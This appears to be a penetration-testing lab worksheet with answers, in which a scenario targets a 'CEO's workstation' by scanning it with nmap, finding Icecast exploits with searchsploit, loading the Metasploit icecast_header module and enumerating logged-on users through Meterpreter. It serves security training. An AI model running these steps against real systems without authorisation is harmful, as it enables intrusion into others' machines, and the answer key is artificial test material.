You've been provided full access to the network and are getting ping responses from the CEOâ€™s workstation.

Perform a service and version scan using Nmap to determine which services are up and running:

1. Run the Nmap command that performs a service and version scan against the target.

	**Answer: nmap -sV 192.168.0.20**

2. From the previous step, we see that the Icecast service is running. Let's start by attacking that service. Search for any Icecast 	      	 exploits:

	Run the SearchSploit commands to show available Icecast exploits.

	**Answer: searchsploit icecast windows**

3. Now that we know which exploits are available to us, let's start Metasploit:

	Run the command that starts Metasploit:
	
	**Answer: msfconsole**

5. Run the command to use the Icecast module:
	
	Note: Instead of copying the entire path to the module, you can use the number in front of it.
        
	**Answer: use exploit/windows/http/icecast_header or use 0**

Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.

Bonus

A. Run a Meterpreter post script that enumerates all logged on users.
	
   **Answer: run post/windows/gather/enum_logged_on_users**
